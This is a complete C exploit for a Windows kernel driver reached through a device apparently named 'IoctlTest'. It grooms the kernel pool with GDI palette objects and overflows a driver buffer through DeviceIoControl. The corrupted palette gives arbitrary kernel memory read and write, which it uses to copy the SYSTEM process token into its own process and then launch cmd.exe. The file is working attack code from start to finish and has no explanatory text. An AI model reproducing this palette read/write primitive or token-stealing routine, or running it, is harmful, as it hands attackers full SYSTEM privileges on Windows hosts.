
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <intrin.h>

#define SIOCTL_TYPE 40000
//
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
//
#define IOCTL_SIOCTL_METHOD_BUFFERED \
    CTL_CODE( SIOCTL_TYPE, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS  )


struct renderEntry {
	INT x;
	INT y;
	INT z;
};

struct render {
	ULONG maxNumEntries;
	ULONG minNumEntries;
	struct renderEntry renderEntry[1];
};


VOID readAddr(PVOID addr, BYTE *data, ULONG size);
VOID writeAddr(PVOID addr, BYTE *data, ULONG size);
ULONGLONG GetSystemToken(ULONGLONG kprocess);

HPALETTE hMgr, hWrk;

int __cdecl
main(
	_In_ ULONG argc,
	_In_reads_(argc) PCHAR argv[]
)
{
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFOA StartupInfo;
	struct render *render;
	LOGPALETTE *pal2, *pal, *pal3;
	ULONGLONG kthread, object, objectN, kprocess, token;
	HPALETTE hPal[4096], hPal2[4096], hPad[32], hTmpMgr;
	HANDLE hDevice;
	ULONG bytesReturned;
	BOOL bRc;
	BYTE output[4096], *leak;
	INT i;

	
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	
	/* 0xbe0 allocations */
	pal = (LOGPALETTE *)malloc(sizeof(*pal) + 0x2d0 * sizeof(PALETTEENTRY));
	pal->palVersion = 0x300;
	pal->palNumEntries = 0x2d0;
	for (i = 0; i < 4096; i++)
		hPal[i] = CreatePalette(pal);

	/* 0x420 allocations */
	pal2 = (LOGPALETTE *)malloc(sizeof(*pal2) + 0xe0 * sizeof(PALETTEENTRY));
	pal2->palVersion = 0x300;
	pal2->palNumEntries = 0xe0;
	//printf("[+]Spray with 0x420 palettes\n");
	for (i = 0; i < 4096; i++)
		hPal2[i] = CreatePalette(pal2);

	/* Tmp allocations */
	pal3 = (LOGPALETTE *)malloc(sizeof(*pal3) + 0xc0 * sizeof(PALETTEENTRY));
	pal3->palVersion = 0x300;
	pal3->palNumEntries = 0xc0;
	//printf("[+]Allocate 32 palettes of different size\n");
	for (i = 0; i < 32; i ++)
		hPad[i] = CreatePalette(pal3);

	/* Open device */
	hDevice = CreateFileA("\\\\.\\IoctlTest",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Error: CreatFile Failed : %d\n", GetLastError());
		return -1;
	}
	

	render = (struct render *)malloc(sizeof(struct render) + sizeof(renderEntry) * 0x15a);
	memset(render->renderEntry, '\0', sizeof(renderEntry) * 0x15a);
	render->maxNumEntries = 0x55555565 + 0x46;
	render->minNumEntries = 0x15a;

	/* Handle */
	render->renderEntry[341].y = (DWORD)hPal2[1513];
	render->renderEntry[343].z = 0x41414141;
	
	
	/* Create hole */	
	DeleteObject(hPal2[1512]);
	
	/* Free delayed */
	for (i = 0; i < 31; i++)
		DeleteObject(hPad[i]);
	
	/* Claim it */
	bRc = DeviceIoControl(hDevice,
		(DWORD)IOCTL_SIOCTL_METHOD_BUFFERED,
		(PCHAR)render,
		sizeof(struct render) + sizeof(renderEntry) * 0x15a,
		output,
		4095,
		&bytesReturned,
		NULL
	);
	if (!bRc) {
		fprintf(stderr, "Error in DeviceIoControl : %d", GetLastError());
		return -1;

	}
	/* The next palette */
	hTmpMgr = hPal2[1513];

	/*
	ffffeebd4495f000 size:  be0 previous size:    0  (Allocated)  Gh08
	*ffffeebd4495fbe0 size:  420 previous size:  be0  (Allocated) *3SR. VULN BUFFER
	
	ffffeebd`44960000 size:  be0 previous size:    0  (Allocated)  Gh08 rsv (zero?) ffffc3a2c4834000   
	ffffeebd`44960be0 size:  420 previous size:  be0  (Allocated)  Gh08 hTmpMgr ffffc3a2c4834be0   

	ffffeebd44961000 size:  be0 previous size:    0  (Allocated)  Gh08  hMgr ffffc3a2c4835000   
	ffffeebd44961be0 size:  420 previous size:  be0  (Allocated)  Gh08  hWorker ffffc3a2c4835be0   
	*/

	leak = (BYTE *)malloc(0x430 * sizeof(PALETTEENTRY));

	/* Read the next page */
	GetPaletteEntries(hTmpMgr, 0, 0x3fe, (PALETTEENTRY *)leak);

	/* Read ETHREAD from hMgr */
	kthread = *(ULONGLONG *)(leak + 0x388 + 0x20);
	//printf("[+] ETHREAD = %llx\n", kthread);

	/* Read hMgr handle */
	hMgr = *(HPALETTE *)(leak + 0x388 + 0x10);
	//printf("[+] hMgr %llx\n", hMgr);

	/* Set hMgr point to hWorker */
	object = *(ULONGLONG *)(leak + 0x388 + 0x88);
	object &= ~0xfff;
	*(ULONGLONG *)(leak + 0x388 + 0x88) = object + 0xbe0 + 0x88;
	//printf("[+] htmp object %llx\n", object);

	/* Set hWorker length */
	*(DWORD *)(leak + 0x388  + 0x2c) = 0x10000;

	/* Read worker handle */
	hWrk = *(HPALETTE *)(leak + 0x388 + 0xbf0);
	
	/* Set the changes */
	SetPaletteEntries(hTmpMgr, 0, 0x3fe, (PALETTEENTRY *)leak);

	/* Find rsv handle */
	for (i = 0; i < 4096; i++) {
		if (hMgr == hPal[i])
			break;
	}

	/* Fix rsv */
	readAddr((PVOID)object, leak, 0xbe0);
	object -= 0x1000;
	writeAddr((PVOID)object, leak, 0xbe0);

	*(ULONGLONG *)leak = 0x3830684723be0000;
	writeAddr((PVOID)object, leak, 8);
	*(HPALETTE *)leak = hPal[i - 1];
	writeAddr((PVOID)(object + 0x10), leak, 8);

	/* Fix hTmpMgr */
	object += 0xbe0;
	*(ULONGLONG *)leak = 0x38306847234200be;
	writeAddr((PVOID)object, leak, 8);

	/* Fix hMgr */
	object += 0x420;
	*(ULONGLONG *)leak = 0x3830684723be0000;
	writeAddr((PVOID)object, leak, 8);

	/* Fix hWorker */
	object += 0xbe0;
	*(ULONGLONG *)leak = 0x38306847234200be;
	writeAddr((PVOID)object, leak, 8);

	/* Read process */
	readAddr((PVOID)(kthread + 0x220), (BYTE *)&kprocess, 8);
	//printf("kprocess %llx\n", kprocess);

	/* Get token */
	token = GetSystemToken(kprocess);
	
	/* Write token */
	writeAddr((PVOID)(kprocess + 0x358), (BYTE *)&token, 8);
	token &= ~0xf;
	
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	CreateProcessA("c:\\windows\\system32\\cmd.exe",
		"c:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo);
	
	free(render);
	free(pal);
	free(pal2);
	free(pal3);
	free(leak);


	return 0;
}

ULONGLONG GetSystemToken(ULONGLONG kprocess)
{
	ULONGLONG systemToken, activeProcessLinks;
	DWORD entryPid;

	/* Find process by pid */
	activeProcessLinks = kprocess + 0x2e8;

	do {
		/* Get next process */
		readAddr((PVOID)activeProcessLinks, (BYTE *)&activeProcessLinks, 8);

		/* Get pid */
		readAddr((PVOID)(activeProcessLinks - 8), (BYTE *)&entryPid, 8);
	} while (entryPid != 4);
	readAddr((PVOID)(activeProcessLinks + 0x70), (BYTE *)&systemToken, 8);

	return systemToken;
}


VOID readAddr(PVOID address, BYTE *data, ULONG size)
{

	/* Set addr */
	SetPaletteEntries(hMgr, 0, 2, (PALETTEENTRY *)&address);

	/* Read */
	GetPaletteEntries(hWrk, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY *)data);
}

VOID writeAddr(PVOID address, BYTE *data, ULONG size)
{
	
	/* Set addr */
	SetPaletteEntries(hMgr, 0, 2, (PALETTEENTRY *)&address);

	/* Write */
	SetPaletteEntries(hWrk, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY *)data);
}

